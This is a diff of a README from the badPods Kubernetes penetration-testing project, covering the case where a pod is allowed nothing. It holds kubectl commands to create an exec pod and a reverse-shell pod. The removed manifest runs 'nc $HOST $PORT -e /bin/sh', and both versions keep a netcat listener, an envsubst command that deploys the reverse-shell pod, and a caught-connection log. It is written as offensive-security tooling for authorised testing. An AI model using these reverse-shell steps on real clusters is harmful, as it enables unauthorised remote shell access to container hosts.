@@ -1,76 +1,34 @@
-## You have nothing
+# Bad Pod #8: Nothing allowed
 
 The pod security policy or admission controller has blocked access to all of the host's namespaces and restricted all capabilities.  **Do not despair**, especially if the target cluster is running in a cloud environment. 
 
 
 # Pod Creation
-
 ## Create a pod you can exec into
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pod-nothing-allowed
-  labels: 
-    app: pentest
-spec:
-  containers:
-  - name: nothing-allowed
-    image: ubuntu
-    command: [ "/bin/bash", "-c", "--" ]
-    args: [ "while true; do sleep 30; done;" ]
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
-  ```
-[nothing-allowed.yaml](nothing-allowed.yaml)
-
-#### Option 1: Create pod from local yaml 
+Create pod
 ```bash
-kubectl apply -f nothing-allowed.yaml 
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml 
+```
+Exec into pod 
+```bash
+kubectl exec -it nothing-allowed-exec-pod -- bash
 ```
 
-#### Option 2: Create pod from github hosted yaml
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/nothing-allowed/nothing-allowed.yaml 
-```
+## Reverse shell pod
 
-#### Exec into pod 
-```bash
-kubectl exec -it pod-nothing-allowed -- bash
-```
-
-## Or, create a reverse shell pod
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pod-nothing-allowed-revshell
-  labels: 
-    app: pentest
-spec:
-  containers:
-  - name: nothing-allowed-revshell
-    image: busybox
-    command: [ "/bin/sh", "-c", "--" ]
-    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
-  restartPolicy: Always  
-  ```
-[nothing-allowed-revshell.yaml](nothing-allowed-revshell.yaml)
-
-#### Set up listener
+Set up listener
 ```bash
 nc -nvlp 3116
 ```
 
-#### Create the pod
+Create pod from local manifest without modifying it by using env variables and envsubst
 ```bash
-# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/nothing-allowed/nothing-allowed-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml | kubectl apply -f -
 ```
 
-#### Catch the shell and chroot to /host 
+Catch the shell
 ```bash
-~ nc -nvlp 3116
+$ nc -nvlp 3116
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
 ```
